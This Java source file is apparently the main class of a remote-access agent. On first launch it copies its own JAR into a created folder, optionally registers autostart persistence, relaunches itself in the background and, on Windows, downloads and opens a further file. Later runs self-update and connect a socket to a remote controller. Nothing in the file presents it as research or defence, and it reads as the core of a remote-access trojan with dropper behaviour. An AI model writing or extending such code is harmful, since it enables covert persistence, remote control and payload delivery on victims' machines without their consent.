package org.anywhere.agent;

import lombok.Getter;
import org.anywhere.agent.settings.Settings;
import org.anywhere.agent.socket.SocketManager;
import org.anywhere.agent.utils.computer.Persistence;
import org.anywhere.agent.arguments.ArgumentParser;
import org.anywhere.agent.arguments.Configuration;
import org.anywhere.agent.controller.ControlManager;
import org.anywhere.agent.decoder.DecoderManager;
import org.anywhere.agent.encoder.EncoderManager;
import org.anywhere.agent.utils.application.Application;
import org.anywhere.agent.utils.computer.Computer;
import org.anywhere.agent.utils.computer.Setup;
import org.anywhere.agent.utils.computer.Updater;

public class Agent {

    @Getter
    private final Configuration configuration;
    @Getter
    private final boolean windows;
    @Getter
    private final Computer computer;
    private final Setup setup;
    @Getter
    private final EncoderManager encoderManager;
    @Getter
    private final DecoderManager decoderManager;
    @Getter
    private ControlManager controlManager;
    @Getter
    private final SocketManager socketManager;
    @Getter
    private final Updater updater;

    public Agent(final String[] args) {
        this.configuration = new Configuration();
        this.windows = System.getProperty("os.name").toLowerCase().contains("windows");
        this.updater = new Updater(this.windows);
        this.encoderManager = new EncoderManager();
        this.decoderManager = new DecoderManager();
        this.socketManager = new SocketManager(this);
        this.setup = new Setup(this, this.isWindows());
        this.computer = new Computer(this.windows);

        final ArgumentParser argumentParser = new ArgumentParser(this.configuration, args);
        this.configuration.set("mode", "first");
        argumentParser.loadArguments();
    }

    public void start() {
        this.setup.setupValues();
        final String mode = String.valueOf(this.configuration.get("mode")).toLowerCase();
        switch (mode) {
            case "first":
                final Persistence persistence = new Persistence(this.isWindows());
                persistence.createFolder();
                persistence.moveJar();
                if (Settings.AUTOSTART)
                    persistence.register();
                this.computer.launchBack();
                if (this.isWindows() && Settings.OTHERFILE) new Application().downloadAndOpen();
                System.exit(-1);
                break;
            case "start":
            case "back":
                this.updater.updateAsPossible();
                this.controlManager = new ControlManager(this);
                this.getSocketManager().getConnection().connect(mode);
                break;
            case "update":
                this.updater.makeAfterUpdate();
                break;
            default:
                throw new IllegalStateException("Unexpected value: " + String.valueOf(this.configuration.get("mode")).toLowerCase());
        }
    }
}
